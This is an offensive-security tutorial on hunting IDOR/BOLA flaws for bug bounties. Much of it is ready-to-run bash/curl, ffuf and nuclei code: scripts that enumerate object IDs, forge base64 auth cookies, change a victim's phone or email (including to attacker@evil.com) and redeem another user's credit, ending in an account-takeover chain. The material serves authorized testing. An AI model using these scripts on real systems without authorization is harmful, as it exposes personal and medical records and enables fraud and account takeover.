# IDOR (Insecure Direct Object Reference) — Complete Hunting Methodology

## Table of Contents

1. Definition and Root Cause
2. Why IDOR Keeps Happening (Architectural Causes)
3. Discovery Methodology
4. Real-World Scenario 1: E-Commerce Order/Invoice IDOR
5. Real-World Scenario 2: SaaS Multi-Tenant Cross-Account IDOR
6. Real-World Scenario 3: Mobile App API IDOR (Hidden Parameters)
7. Real-World Scenario 4: GraphQL IDOR via Nested Fields
8. Real-World Scenario 5: File/Document Storage IDOR
9. Real-World Scenario 6: IDOR in Auth Tokens Themselves
10. Advanced Bypass Techniques (ID Obfuscation, UUIDs, Parameter Pollution)
11. Chaining IDOR into Account Takeover
12. Practical Bash/Curl Toolkit
13. Decision Tree: IDOR Exploitation Path
14. Triager Rejection Cases & False-Positive Analysis
15. Severity and CVSS Scoring Guidance
16. Reviewer Checklist
17. Hunter Checklist

---

## 1. Definition and Root Cause

An Insecure Direct Object Reference (IDOR) occurs when an application exposes a reference to an internal object — a database row, a file, a session, a document — directly to the user (typically as an ID in a URL, request body, or header) and then uses that reference to fetch or modify data **without independently verifying that the requesting user is authorized to access that specific object**.

The core distinction that separates IDOR from generic "Broken Access Control" is specificity: IDOR is about **object-level** authorization. The application correctly authenticates the user (it knows who you are) and may even correctly authorize the *endpoint* (you're allowed to call `GET /api/orders/{id}` because you're a logged-in customer) — but it fails to check that the *specific object* referenced by `{id}` actually belongs to *you*.

This is why IDOR is sometimes called BOLA (Broken Object Level Authorization) in API security literature, particularly the OWASP API Security Top 10, where it has held the #1 spot for years running. The naming difference is mostly historical — REST-era literature says "IDOR", API-era literature says "BOLA" — the underlying flaw is identical: **the object identifier is trusted more than it should be.**

## 2. Why IDOR Keeps Happening (Architectural Causes)

Understanding *why* this bug is so persistent helps you hunt for it more efficiently, because it tells you exactly where to look.

### 2.1 The ORM Convenience Trap

Modern ORMs (Object-Relational Mappers) make it trivially easy to write:

```python
order = Order.objects.get(id=request.GET['order_id'])
return JsonResponse(order.to_dict())
```

This one-liner is syntactically correct, passes code review at a glance, and works perfectly in every functional test — because functional tests are run by the object's actual owner. The missing line is:

```python
if order.user_id != request.user.id:
    raise PermissionDenied
```

Developers routinely forget this second line because the ORM call *looks* complete on its own. This is the single most common root cause of IDOR in modern web applications, and it applies identically across Django, Rails' ActiveRecord, Laravel's Eloquent, Sequelize, and virtually every other ORM.

### 2.2 Authentication/Authorization Conflation

Many frameworks provide a single decorator/middleware like `@login_required` and developers mentally treat "logged in" as synonymous with "authorized for this data." `@login_required` proves *authentication* (who you are) but says nothing about *object-level authorization* (whether you should see this specific record). Teams that don't have a strict, enforced pattern for object ownership checks will produce IDORs at scale, because the framework doesn't force the check — it only makes authentication easy.

### 2.3 Microservices and Trust Boundary Confusion

In a microservices architecture, Service A (e.g., an API gateway) might authenticate the user and pass along a `user_id`. Service B (e.g., an orders service) may implicitly trust that any `user_id` in the request is legitimate rather than re-verifying it — because "the gateway already checked auth." If the `user_id` is passed as a regular parameter rather than derived from a verified session/token *inside* Service B, an attacker can simply substitute a different `user_id` and Service B will happily serve the data, since object-level authorization was assumed to be someone else's job.

### 2.4 Frontend-Only Enforcement

Some applications hide UI elements (buttons, links, sections) based on ownership/role, and mistakenly believe this constitutes access control. The backend endpoint remains fully reachable and fully functional for anyone who knows or guesses the URL/ID — the "protection" was purely cosmetic. This is extremely common in single-page applications where a junior developer conflates "the user can't see the button" with "the user can't perform the action."

### 2.5 Legacy Code Paths

A common pattern in real bug bounty reports: the *primary* user-facing endpoint (e.g., "View My Profile") has proper ownership checks, but a *secondary*, less-used endpoint that accomplishes a similar goal (e.g., an old "Export Profile PDF" feature, or an internal admin tool repurposed for customer use) was never updated with the same check when the authorization model changed. Hunters who only test the "obvious" endpoint miss these.

## 3. Discovery Methodology

### 3.1 Map Every Object Reference

Before testing anything, build a complete list of every place the application accepts an identifier that maps to a specific piece of user data:

- URL path segments: `/api/users/1234`, `/orders/5678/invoice`
- Query parameters: `?user_id=1234`, `?account=5678`
- Request body fields (JSON/form): `{"userId": 1234}`
- Headers: some apps pass tenant/account IDs in custom headers like `X-Account-Id`
- Hidden form fields
- WebSocket message payloads
- GraphQL query/mutation arguments (see Scenario 4 below)

Use `katana` (crawling) and browser proxy history (Burp/ZAP) to build this list exhaustively — IDOR hunters who only test the 5–6 "obvious" endpoints (profile, orders, messages) miss the long tail of secondary features (export, share, duplicate, archive, audit-log, notification-preferences) that frequently have weaker or entirely absent checks.

### 3.2 The Two-Account Methodology

This is non-negotiable for reliable IDOR testing — a single account cannot prove an IDOR exists, because you cannot distinguish "this endpoint has no ownership check" from "this endpoint correctly returns my own data."

1. Register **Account A** and **Account B** with distinct, clearly-fake test data (different names, different content, different uploaded files) so that when you see cross-account leakage, it's unambiguous.
2. Perform the same set of actions on both accounts (place an order, upload a document, send a message, update a setting) so you have a matched set of object IDs to swap.
3. Keep two separate authenticated sessions (two browser profiles, or two sets of saved Burp session tokens) so you can quickly swap the session token while keeping the same request.

### 3.3 Bash/Curl Two-Account IDOR Test Harness

```bash
#!/bin/bash
# idor_test.sh — swap session tokens against the same object ID and diff the responses

TARGET="https://target.example.com/api/orders"
OBJECT_ID="1042"

TOKEN_A="Bearer eyJhbGciOi...userA_token"
TOKEN_B="Bearer eyJhbGciOi...userB_token"

echo "[*] Requesting object $OBJECT_ID as User A (owner)"
curl -s -H "Authorization: $TOKEN_A" "$TARGET/$OBJECT_ID" -o resp_userA.json
echo "[*] Requesting object $OBJECT_ID as User B (should NOT have access)"
curl -s -H "Authorization: $TOKEN_B" "$TARGET/$OBJECT_ID" -o resp_userB.json

echo "[*] Diffing responses..."
diff resp_userA.json resp_userB.json

if cmp -s resp_userA.json resp_userB.json; then
    echo "[!] IDENTICAL RESPONSES — User B received User A's data. Possible IDOR."
else
    echo "[+] Responses differ — check resp_userB.json manually to confirm it's a proper denial (403/404), not partial leakage."
fi
```

Run this across GET, PUT, PATCH, and DELETE — a target is frequently protected on GET but not on the state-changing verbs, or vice versa.

```bash
#!/bin/bash
# idor_multi_method.sh — test all common HTTP methods for the same object with a foreign session

TARGET="https://target.example.com/api/orders/1042"
TOKEN_B="Bearer eyJhbGciOi...userB_token"

for METHOD in GET PUT PATCH DELETE; do
    echo "=== Testing $METHOD ==="
    curl -s -X "$METHOD" -H "Authorization: $TOKEN_B" \
         -H "Content-Type: application/json" \
         -d '{"status":"cancelled"}' \
         -o /dev/null -w "HTTP %{http_code}\n" \
         "$TARGET"
done
```

### 3.4 Sequential and Predictable ID Enumeration

If IDs are sequential integers, enumerate a range around your own known IDs to check for a mass-IDOR (a single vulnerable endpoint that can be walked across the entire user base):

```bash
#!/bin/bash
# idor_enum_range.sh — walk a range of sequential IDs with a single session token
# and log which ones return 200 (potential unauthorized access)

TOKEN="Bearer eyJhbGciOi...attacker_token"
BASE="https://target.example.com/api/orders"
START=1000
END=1100

for ID in $(seq $START $END); do
    CODE=$(curl -s -o /tmp/resp_$ID.json -w "%{http_code}" -H "Authorization: $TOKEN" "$BASE/$ID")
    if [ "$CODE" == "200" ]; then
        echo "[!] ID $ID returned 200 — inspect /tmp/resp_$ID.json"
    fi
done
```

Rate-limit this appropriately (`sleep 0.3` between requests) to stay within the program's testing guidelines and avoid tripping abuse detection that could get your account flagged before you've documented the finding.

### 3.5 Testing Non-Numeric/UUID IDs

Don't assume UUIDs are safe just because they're not sequential. Test them exactly the same way — the *unpredictability* of a UUID only matters if it's genuinely used as a secret capability token (like a share link). If the application discloses UUIDs to users elsewhere (e.g., in a list endpoint, in another user's public profile, in a URL that gets logged/cached), the "unguessability" defense collapses entirely, because you don't need to guess — you can harvest.

```bash
#!/bin/bash
# idor_harvest_uuids.sh — collect UUIDs disclosed in a public/semi-public listing endpoint,
# then test each one against your own session for unauthorized access

curl -s -H "Authorization: Bearer $TOKEN_A" \
  "https://target.example.com/api/public/directory?page=1" \
  | jq -r '.results[].id' > harvested_uuids.txt

while read -r UUID; do
    CODE=$(curl -s -o /tmp/resp_$UUID.json -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN_A" \
        "https://target.example.com/api/private/profile/$UUID")
    echo "$UUID -> $CODE"
done < harvested_uuids.txt
```

## 4. Real-World Scenario 1: E-Commerce Order/Invoice IDOR

**Pattern seen repeatedly across bug bounty reports on retail and marketplace platforms:**

An e-commerce platform generates a PDF invoice for every completed order, accessible at:

```
GET /account/orders/{order_id}/invoice.pdf
```

The order listing page (`/account/orders`) correctly filters to show only the logged-in user's own orders. However, the invoice PDF endpoint itself only checks that *a* valid session exists — it does not verify that `{order_id}` belongs to the session's user. Because `order_id` is a sequential integer visible in the URL of every user's own invoice, an attacker who has placed a single order (to get a baseline ID) can enumerate nearby IDs and download other customers' invoices, which typically contain: full name, billing/shipping address, partial payment card digits, items purchased, and order value.

**Why this specific pattern recurs constantly**: invoice/receipt/PDF-generation features are frequently built by a *different* team or as an afterthought bolted onto the checkout flow, and are tested functionally (does the PDF render correctly?) rather than for authorization, because "you can only see your own invoice link" from the UI — the team never considered that the URL itself is guessable and independently reachable.

**Escalation**: if the invoice contains any token, magic link, or "pay now" link for outstanding balance, this becomes a direct opportunity for financial fraud (paying/manipulating someone else's balance) rather than just a privacy leak — always check what's actually inside the leaked document, not just that you obtained it.

**Bash PoC**:

```bash
#!/bin/bash
# Confirm invoice IDOR by comparing your own invoice to a neighboring ID's invoice
TOKEN="Bearer eyJhbGciOi...myOwnToken"
MY_ORDER_ID=50231

for OFFSET in -5 -3 -1 1 3 5; do
    TARGET_ID=$((MY_ORDER_ID + OFFSET))
    curl -s -H "Authorization: $TOKEN" \
        "https://shop.example.com/account/orders/$TARGET_ID/invoice.pdf" \
        -o "invoice_$TARGET_ID.pdf"
    file "invoice_$TARGET_ID.pdf"
done
```

If `file` reports a valid PDF for IDs that aren't yours, extract text (`pdftotext invoice_XXXX.pdf -`) to confirm it contains someone else's name/address rather than an error page rendered as a PDF (a common false positive — see Section 14).

## 5. Real-World Scenario 2: SaaS Multi-Tenant Cross-Account IDOR

**Pattern**: B2B SaaS products (project management tools, CRMs, HR platforms) organize data by "workspace" or "organization" (tenant). A common and severe IDOR variant here is **cross-tenant IDOR**, not just cross-user-within-the-same-tenant.

Example endpoint:
```
GET /api/workspaces/{workspace_id}/documents/{document_id}
```

Many implementations correctly check "does the requesting user belong to `workspace_id`?" but the check is sometimes performed against the *wrong* workspace variable when the endpoint internally resolves the document first and the workspace second, or when the authorization middleware only validates `workspace_id` matches *a* workspace the user belongs to (if the user is a member of multiple workspaces) without confirming the *document* actually belongs to *that specific* `workspace_id` in the URL.

**Concrete exploitation flow**:
1. Create two accounts belonging to two entirely separate organizations/workspaces (sign up twice with different company names — most B2B SaaS trials allow this freely).
2. In Workspace A, create a document and note its `document_id`.
3. From a session logged into Workspace B, request `/api/workspaces/{workspace_B_id}/documents/{document_A_id}` — substituting Workspace A's document ID but keeping Workspace B's ID in the path (this specifically tests whether the backend cross-validates document-to-workspace ownership, or just checks "is this user in *some* workspace").
4. Also test the inverse: `/api/workspaces/{workspace_A_id}/documents/{document_A_id}` while authenticated as a Workspace B user (tests whether workspace membership itself is checked at all).

**Why triagers take this seriously**: cross-tenant IDOR in B2B SaaS is treated as a business-ending bug class by most companies, because it violates the fundamental promise of the multi-tenant architecture (data isolation between paying customers) — expect Critical severity if you can demonstrate reading or, worse, modifying another tenant's data.

**Bash PoC**:

```bash
#!/bin/bash
TOKEN_WORKSPACE_A="Bearer ...tokenA"
TOKEN_WORKSPACE_B="Bearer ...tokenB"
WORKSPACE_A_ID="ws_8841"
WORKSPACE_B_ID="ws_9102"
DOC_ID_BELONGING_TO_A="doc_5521"

echo "[*] Test 1: Workspace B session, Workspace B's own ID in path, A's document ID"
curl -s -H "Authorization: $TOKEN_WORKSPACE_B" \
    "https://saas.example.com/api/workspaces/$WORKSPACE_B_ID/documents/$DOC_ID_BELONGING_TO_A" \
    -o test1.json -w "HTTP %{http_code}\n"

echo "[*] Test 2: Workspace B session, Workspace A's ID in path, A's document ID"
curl -s -H "Authorization: $TOKEN_WORKSPACE_B" \
    "https://saas.example.com/api/workspaces/$WORKSPACE_A_ID/documents/$DOC_ID_BELONGING_TO_A" \
    -o test2.json -w "HTTP %{http_code}\n"

cat test1.json test2.json
```

## 6. Real-World Scenario 3: Mobile App API IDOR (Hidden Parameters)

**Pattern**: Mobile applications often talk to the same backend API as the web app, but the mobile client sends additional parameters that never appear in the web flow — because the mobile UI was built later, by a different team, with looser review.

A common discovery method: intercept mobile app traffic (via `mitmproxy` or Burp with the phone's proxy configured) and diff the request bodies against the equivalent web request. Mobile apps frequently include a raw `user_id` or `account_id` field directly in the JSON body **in addition to** the session token — because the mobile client was written against an internal API that expected the caller to specify which user it was acting on behalf of (e.g., for shared-device or multi-profile household apps), and the server-side check for "does this user_id match the authenticated session" was either never added or was only added to the web-specific code path.

```bash
#!/bin/bash
# Test whether a mobile-only "user_id" body field overrides the authenticated session's actual identity
TOKEN_ATTACKER="Bearer ...attackerToken"
VICTIM_USER_ID="88213"

curl -s -X POST "https://api.example.com/mobile/v2/profile/update" \
    -H "Authorization: $TOKEN_ATTACKER" \
    -H "Content-Type: application/json" \
    -d "{\"user_id\": \"$VICTIM_USER_ID\", \"phone_number\": \"+15555550100\"}" \
    -w "\nHTTP %{http_code}\n"

# Then verify as the victim (or via an admin-visible audit trail) whether the phone number actually changed
```

If this succeeds, you've found a direct account-modification IDOR that's normally invisible to anyone testing only the web application, because the vulnerable parameter simply doesn't exist in the web client's requests. **Always test mobile API traffic separately — don't assume web and mobile share identical authorization enforcement even when they hit the same endpoints.**

## 7. Real-World Scenario 4: GraphQL IDOR via Nested Fields

**Pattern**: covered briefly in `saml-graphql.md`, expanded here with a concrete walkthrough.

A social/professional networking platform's GraphQL API has a `user(id: ID!)` query used by the public-facing profile page, which correctly returns only public fields (name, title, public bio) for arbitrary IDs. Separately, a `connectionRequest` mutation (used when clicking "Add to Network" / "Connect") internally calls the *same* underlying resolver to validate the target user exists, but the resolver used in that code path returns the **full** user object — including private fields (email, phone, precise location) — because the resolver's field-level authorization was written assuming "this is only called from the public profile page, which only projects public fields anyway," not realizing GraphQL callers can request *any* field defined on the type, regardless of which mutation triggered the resolver.

**Concrete exploitation**: Using a GraphQL introspection query (or observed traffic from the "Add to Network" button), identify the exact mutation and its return type:

```bash
#!/bin/bash
# Step 1: introspect to find fields available on the User type
curl -s -X POST "https://api.example.com/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}' \
    | jq .

# Step 2: fire the mutation but manually append private fields not shown in the normal UI's query
curl -s -X POST "https://api.example.com/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "query": "mutation { sendConnectionRequest(targetUserId: \"88213\") { target { id fullName email phoneNumber city country } } }"
    }' | jq .
```

If the response includes `email`, `phoneNumber`, and precise `city`/`country` for a user whose public profile only ever showed name and title, that's the IDOR — the mutation's return type exposes fields that were never meant to be reachable outside an authenticated, permissioned context.

## 8. Real-World Scenario 5: File/Document Storage IDOR

**Pattern**: File upload/download features backed by cloud storage (S3-compatible buckets, Azure Blob, GCS) frequently generate a direct, static URL for the uploaded file and rely on **URL obscurity** (a random-looking path) as the *only* access control, with no session/token check at all on the storage layer itself.

```
https://cdn.example.com/uploads/user-documents/a1b2c3d4-....pdf
```

If these URLs are ever exposed anywhere an attacker can enumerate them — a listing API that returns the full URL for every document (even ones not belonging to the current user, e.g., in a shared-team-folder feature where the URL leaks regardless of the viewer's actual permission on that specific file), search engine indexing (if the bucket/CDN isn't set to `noindex` and URLs get crawled), or Referer-header leakage from an insecure preview page — the "random URL" defense collapses.

**Testing methodology**:
1. Upload a file as User A, capture the resulting URL.
2. Check every API response across the entire application (not just the upload response) for any place that same URL, or a predictable variant of it, appears to User B.
3. Test whether the storage URL itself, when requested directly with no auth headers at all (not even User B's session — literally anonymous), still serves the file — this is common when developers believe the URL's randomness alone is sufficient and skip authorization at the storage layer entirely.

```bash
#!/bin/bash
# Test if a "private" document URL is actually protected by anything beyond obscurity
DOC_URL="https://cdn.example.com/uploads/user-documents/a1b2c3d4-5e6f-....pdf"

echo "[*] Testing with no authentication at all:"
curl -s -o /dev/null -w "HTTP %{http_code}\n" "$DOC_URL"

echo "[*] Testing with a completely unrelated user's session:"
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN_UNRELATED_USER" "$DOC_URL"
```

If both return 200 with the file content, document this clearly: the severity hinges entirely on how sensitive the file content is and how the URL could realistically be discovered by someone who isn't the uploader — a triager will ask exactly this, so pre-empt it in your report (see Section 14).

## 9. Real-World Scenario 6: IDOR in Auth Tokens Themselves

**Pattern**: some applications encode a user identifier directly into an authentication artifact — a base64-encoded cookie, a custom header, or even a JWT's non-signature-protected portion misused by client-side logic — and the *format* of that artifact is validated, but its *ownership* is not cross-checked against the session store.

Example: an application sets a cookie like:

```
auth_pair=dXNlcklkOjEyMzR8c2Vzc2lvbklkOmFiY2Q=
```

Base64-decoded: `userId:1234|sessionId:abcd`. If the backend trusts the `userId` embedded in this cookie for authorization decisions on certain endpoints (rather than looking up the session server-side and deriving the user ID from *that*), an attacker who can predict or observe another valid `sessionId` (e.g., through a separate leak, or because session IDs are also weakly generated) can construct a cookie combining **their own valid sessionId** with **someone else's userId**, and if the endpoint only validates that *a* session is valid (not that the embedded userId matches the session's actual owner), full impersonation results.

```bash
#!/bin/bash
# Decode and manipulate a suspicious auth cookie to test for embedded-identifier trust
ORIGINAL_COOKIE="dXNlcklkOjEyMzR8c2Vzc2lvbklkOmFiY2Q="
echo "$ORIGINAL_COOKIE" | base64 -d
# Output: userId:1234|sessionId:abcd

# Construct a forged cookie: your own valid sessionId, but a victim's userId
FORGED=$(echo -n "userId:9999|sessionId:abcd" | base64)
echo "Forged cookie: $FORGED"

curl -s -H "Cookie: auth_pair=$FORGED" \
    "https://target.example.com/api/account/settings" \
    -w "\nHTTP %{http_code}\n"
```

This is a less common pattern than URL/parameter-based IDOR, but it's exactly the kind of finding that separates a strong bug bounty report from a mediocre one — always inspect the actual bytes of every auth-related cookie/header rather than treating them as opaque blobs.

## 8.5 Real-World Scenario 5b: Healthcare/Education Records IDOR (High-Sensitivity Data Classes)

**Pattern**: platforms handling healthcare records, student records, or legal case files carry regulatory obligations (HIPAA, FERPA, GDPR special-category data) that make IDOR findings in this space consistently rated Critical regardless of how "simple" the underlying bug looks.

A patient portal exposes lab results at:
```
GET /portal/api/patients/{patient_id}/lab-results/{result_id}
```
The `patient_id` is derived from the session on the main dashboard, but a "Download PDF Report" button constructs its link client-side using a `patient_id` value stored in a JavaScript variable that was itself populated from an earlier, less-guarded API call. If that earlier call's `patient_id` field can be tampered with (e.g., it was originally meant to support a "guardian views dependent's records" feature and accepts any `patient_id` the guardian claims access to, without a server-side relationship check), an attacker with any account whatsoever can pull arbitrary patients' lab results by substituting IDs.

**Why this scenario matters as a hunting pattern**: family/guardian/delegate-access features (a parent viewing a child's records, a manager viewing a report's data, an accountant viewing a client's filings) are a *recurring* source of IDOR because they intentionally break the simple "user can only see their own data" model — the relationship between the two parties has to be checked explicitly, and it's frequently checked only at UI-render time ("show the guardian dashboard") rather than at every subsequent API call that the guardian dashboard makes.

```bash
#!/bin/bash
# Test guardian/delegate-access relationship enforcement
TOKEN_GUARDIAN="Bearer ...guardianToken"
LEGITIMATE_DEPENDENT_ID="4471"
UNRELATED_PATIENT_ID="9982"

echo "[*] Legitimate access (should succeed):"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
    -H "Authorization: $TOKEN_GUARDIAN" \
    "https://portal.example.com/api/patients/$LEGITIMATE_DEPENDENT_ID/lab-results/1"

echo "[*] Unrelated patient (should fail with 403, testing if it doesn't):"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
    -H "Authorization: $TOKEN_GUARDIAN" \
    "https://portal.example.com/api/patients/$UNRELATED_PATIENT_ID/lab-results/1"
```

Document the exact regulatory data class exposed (diagnosis codes, medications, grades, disciplinary records, financial account numbers) in your report — this single detail is often what pushes severity from High to Critical in the eyes of a security team that has compliance obligations riding on it.

## 12.5 Automating IDOR Discovery at Scale

Manual two-account testing doesn't scale well across an application with hundreds of endpoints. Once you've confirmed the *pattern* manually on a handful of endpoints, automate the sweep across everything `katana`/Burp discovered.

### 12.5.1 Extracting Candidate Endpoints from Crawl Data

```bash
#!/bin/bash
# Pull every URL containing a numeric or UUID-like path segment from katana's crawl output
grep -oE 'https?://[^ ]+' crawled_urls.txt \
    | grep -E '/[0-9]{2,}(/|$|\?)|/[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}' \
    | sort -u > idor_candidates.txt

wc -l idor_candidates.txt
```

### 12.5.2 Batch Cross-Account Diffing with a Simple Python Helper Called from Bash

```bash
#!/bin/bash
# For each candidate endpoint, fetch with both tokens and flag identical, non-empty, non-error responses
TOKEN_A="Bearer ...tokenA"
TOKEN_B="Bearer ...tokenB"

while read -r URL; do
    RESP_A=$(curl -s -H "Authorization: $TOKEN_A" "$URL")
    RESP_B=$(curl -s -H "Authorization: $TOKEN_B" "$URL")

    if [ "$RESP_A" == "$RESP_B" ] && [ -n "$RESP_A" ] && [ "${#RESP_A}" -gt 20 ]; then
        echo "[!] IDENTICAL non-trivial response for A and B: $URL"
    fi
done < idor_candidates.txt > idor_scan_results.txt

echo "[*] Scan complete. Review idor_scan_results.txt — note this flags identical responses,"
echo "    which includes legitimate shared/public data as well as true IDORs. Manual review is still required."
```

**Important caveat**: this automated sweep produces a *candidate list*, not confirmed findings — a large fraction of "identical response" hits will be legitimately shared/public data (Section 14.2). Treat automation as a triage funnel that narrows hundreds of endpoints down to a few dozen worth manual review, never as a source of ready-to-submit findings.

### 12.5.3 Using Burp Suite's Autorize / Auth Analyzer Extensions

For a GUI-based equivalent of the above, the community Burp extensions **Autorize** and **Auth Analyzer** automate exactly this pattern: they replay every request your normal (low-privilege) browsing session makes, but substitute a second, lower-privileged or different-user token, and flag responses that don't show the expected authorization difference. This is worth setting up alongside the bash-based sweep — the extensions catch requests you'd otherwise need to manually re-derive from crawl data, since they hook directly into live Burp proxy traffic as you browse the app normally with Account A.

## 15.5 Constructing a CVSS Vector for an IDOR Finding

Rather than asserting "this is High severity," construct the actual CVSS 3.1/4.0 vector so the triager can verify your reasoning line by line. Example for the e-commerce invoice IDOR (Scenario 1):

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

AV:N  — Attack Vector: Network (exploitable directly over HTTP)
AC:L  — Attack Complexity: Low (simple ID substitution, no race condition or timing needed)
PR:L  — Privileges Required: Low (attacker needs any valid account, not admin)
UI:N  — User Interaction: None (no victim action required)
S:U   — Scope: Unchanged (impact confined to the vulnerable component)
C:H   — Confidentiality: High (full PII + partial payment data exposed)
I:N   — Integrity: None (read-only finding)
A:N   — Availability: None
```

This maps to a Base Score of 7.5 (High). For the write-IDOR variant in Scenario 2 (cross-tenant document modification), you'd instead set `I:H` (and potentially `S:C` if the flaw crosses a genuine security/tenant boundary as defined by CVSS 3.1's scope guidance), pushing the score into Critical territory. Including this vector breakdown in your report — even if the program's own triager recalculates it — demonstrates rigor and substantially speeds up acceptance, since you've done the scoring justification work for them instead of leaving it as a negotiation.



### 10.1 HTTP Parameter Pollution (HPP)

Some backends behave inconsistently when the same parameter is supplied multiple times. If an endpoint checks the *first* occurrence of `user_id` for authorization but the *last* occurrence for the actual database query (or vice versa, depending on the web server/framework), you can smuggle a different ID past the check:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/profile?user_id=1234&user_id=9999"
```

Test both orderings and note which value ends up in the actual response.

### 10.2 Content-Type / Body-Format Switching

Some frameworks apply stricter validation/authorization middleware to `application/json` bodies than to `application/x-www-form-urlencoded` or `multipart/form-data` bodies (or vice versa), because the ownership-check middleware was written against one specific parser. Resubmit the exact same logical request in a different encoding:

```bash
# Original (protected) request
curl -s -X PUT "https://target.example.com/api/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"user_id": "9999", "email": "attacker@evil.com"}'

# Same fields, different encoding — sometimes bypasses body-specific middleware
curl -s -X PUT "https://target.example.com/api/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "user_id=9999&email=attacker@evil.com"
```

### 10.3 Method Override Headers

Some frameworks honor `X-HTTP-Method-Override` or `_method` body fields to let a `POST` masquerade as a `PUT`/`DELETE` (common in older Rails/Laravel apps for HTML form compatibility). If a DELETE endpoint is properly protected but the framework also accepts an overridden POST as equivalent, and the override path skips a middleware that only hooks the literal `DELETE` verb, this becomes a bypass:

```bash
curl -s -X POST "https://target.example.com/api/documents/5521" \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-HTTP-Method-Override: DELETE"
```

### 10.4 API Versioning Gaps

Older API versions (`/api/v1/...`) are frequently left running alongside a newer, better-protected version (`/api/v2/...`) for backward compatibility, and authorization improvements made in v2 are sometimes never backported to v1. Always test the same object-access pattern against every discoverable API version.

```bash
for VERSION in v1 v2 v3 legacy internal; do
    echo "=== Testing $VERSION ==="
    curl -s -o /dev/null -w "HTTP %{http_code}\n" \
        -H "Authorization: Bearer $TOKEN_B" \
        "https://target.example.com/api/$VERSION/orders/1042"
done
```

### 10.5 Case Sensitivity and Trailing Characters on IDs

Some ID-lookup code paths are case-sensitive on the ownership check but case-insensitive on the database lookup (or a trailing slash/whitespace is stripped by the router before the lookup but not before the authorization check runs). Worth a quick fuzz pass:

```bash
for VARIANT in "1042" "1042/" "1042%20" "1042.json" "01042" "+1042"; do
    curl -s -o /dev/null -w "%-15s -> HTTP %{http_code}\n" \
        -H "Authorization: Bearer $TOKEN_B" \
        "https://target.example.com/api/orders/$VARIANT" "$VARIANT"
done
```

## 9.5 Real-World Scenario 7: IDOR in Coupon/Promo Code and Referral Systems

**Pattern**: e-commerce and subscription platforms frequently expose a "my referral code" or "my coupon" feature where a code is tied to a specific user's account for tracking/attribution purposes. A common IDOR variant here isn't about reading another user's *personal* data — it's about reading or manipulating another user's *promotional entitlements*, which has a direct financial impact.

Example: a referral dashboard endpoint:
```
GET /api/referrals/{user_id}/stats
POST /api/referrals/{user_id}/redeem
```
The `redeem` endpoint is meant to let a user apply their *own* accumulated referral credit to an order. If `user_id` in the path isn't cross-checked against the authenticated session, an attacker can redeem another user's accumulated credit onto their own order — this is a direct financial-fraud IDOR, distinct from a privacy-disclosure IDOR, and should be reported and scored accordingly (Integrity + Availability of the *victim's* stored value, not just Confidentiality).

```bash
#!/bin/bash
# Test whether another user's referral credit can be redeemed onto the attacker's own order
TOKEN_ATTACKER="Bearer ...attackerToken"
VICTIM_USER_ID="55210"
ATTACKER_ORDER_ID="99871"

curl -s -X POST "https://shop.example.com/api/referrals/$VICTIM_USER_ID/redeem" \
    -H "Authorization: $TOKEN_ATTACKER" \
    -H "Content-Type: application/json" \
    -d "{\"apply_to_order\": \"$ATTACKER_ORDER_ID\"}" \
    -w "\nHTTP %{http_code}\n"

echo "[*] Then check the attacker's own order/account balance to confirm whether the victim's credit was actually applied."
```

**Why this is easy to miss**: hunters fixate on "can I read someone's private data" and overlook financial/loyalty/credit systems, which are just as vulnerable to the exact same object-reference flaw but produce a fraud impact rather than a privacy impact — worth a dedicated pass on any feature involving stored monetary value, credits, points, or discounts tied to a specific account.

## 12.7 Tooling Reference: ffuf and Nuclei for IDOR Discovery

### 12.7.1 ffuf for ID Range Fuzzing with Response-Size Filtering

`ffuf` is faster and more flexible than a raw bash loop for large-scale ID enumeration, particularly because it supports filtering by response size/word count to surface only genuinely different responses:

```bash
ffuf -u "https://target.example.com/api/orders/FUZZ" \
     -w <(seq 1000 2000) \
     -H "Authorization: Bearer $TOKEN_B" \
     -mc 200 \
     -fs 512 \
     -o ffuf_idor_results.json -of json
```

The `-fs 512` flag filters out responses of exactly 512 bytes (adjust to match your observed "not found" response size), so ffuf only reports genuinely different, likely-successful responses rather than flooding you with the same generic denial repeated a thousand times.

### 12.7.2 A Minimal Nuclei Template for a Confirmed IDOR Pattern

Once you've manually confirmed an IDOR on a specific endpoint pattern, it's worth writing a quick custom nuclei template so you can re-check the same pattern across every other subdomain/asset discovered in recon, rather than manually repeating the two-account test on each one:

```yaml
id: custom-idor-order-invoice
info:
  name: Custom IDOR - Order Invoice Cross-Account Access
  author: your-handle
  severity: high
  tags: idor,custom,bac

http:
  - method: GET
    path:
      - "{{BaseURL}}/account/orders/{{order_id}}/invoice.pdf"
    headers:
      Authorization: "Bearer {{other_user_token}}"
    matchers:
      - type: word
        words:
          - "%PDF-"
        part: body
      - type: status
        status:
          - 200
    matchers-condition: and
```

Run it against every subdomain discovered in recon that shares the same backend/codebase (common in multi-brand platforms running the same application under different domains):

```bash
nuclei -t custom-idor-order-invoice.yaml -l alive_hosts.txt -var order_id=1042 -var other_user_token="$TOKEN_B" -o custom_idor_sweep.txt
```

This is especially valuable when a company runs the same underlying application across multiple regional or white-labeled domains — a single confirmed IDOR pattern often reproduces identically across all of them, and demonstrating that breadth (rather than reporting each domain as a separate finding) is both more efficient for you and generally appreciated by triage teams, since it reflects the true scope of the underlying code-level bug.

## 11. Chaining IDOR into Account Takeover

The highest-value IDOR reports rarely stop at "I can view someone else's data." The chain that consistently produces the biggest bounties is:

**Profile/Email IDOR → Attacker changes victim's email to an address they control → Attacker uses "Forgot Password" → Password reset link is sent to the attacker-controlled email → Full account takeover.**

